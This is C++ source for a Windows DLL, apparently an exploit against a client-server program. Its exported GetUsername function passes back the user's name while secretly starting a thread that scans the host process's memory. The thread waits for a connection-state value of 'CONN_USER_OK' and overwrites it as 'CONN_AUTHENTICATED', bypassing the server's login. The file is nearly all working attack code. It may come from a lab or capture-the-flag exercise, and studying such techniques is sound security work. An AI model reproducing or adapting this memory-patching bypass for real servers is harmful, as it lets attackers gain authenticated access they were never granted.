// dllmain.cpp : Defines the entry point for the DLL application.
#include <windows.h>
#include <stdio.h>
#include "..\utils\utils.h"
HMODULE hModule = NULL;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

DWORD WINAPI ThreadProc(
    _In_ LPVOID lpParameter
    )
{
    FILE * file;
    volatile PDWORD hproc = NULL;
    fopen_s(&file, "test.txt", "w");
    BOOLEAN found = FALSE;

    //
    // This thread is started right after 'srvlogin' has been sent from client, meaning recvbuf[] in server begins with 'srvlogin'
    //
    hproc = (PDWORD)GetModuleHandle(NULL);

    //__try
    {
        while (TRUE)
        {
            if (*(PDWORD)(hproc) == 0x10001004)   // 
            {
                found = TRUE;
                break;
            }
            else
            {
                hproc += 1;
            }
        }
    }
    //__except (EXCEPTION_EXECUTE_HANDLER)
    {
    }

    if (found)
    {
        while (TRUE)
        {
            if (*(PDWORD)(hproc) == 0x10001003)   // connState = CONN_USER_OK
            {
                *hproc = 0x10001004;    // change it to CONN_AUTHENTICATED
                break;
            }
        }
    }

    //fprintf_s(f, ")
    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

__declspec(dllexport) BOOLEAN __cdecl GetUsername(char *UserName, DWORD Size)
{
    //
    // Create a new thread
    //
    CreateThread(NULL, 0, &ThreadProc, NULL, 0, NULL);

    //
    // Make sure this DLL will not be freed from the main executable, by incrementing its refcount
    //
    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        (char*)&ThreadProc,
        &hModule
        )
        )
    {
        MessageBoxA(NULL, "Error", "GetModuleHandleEx failed", MB_OK);
    }


    if (GetEnvironmentVariableA("username", UserName, Size) > 0)
    {
        return TRUE;
    }

    return FALSE;
}
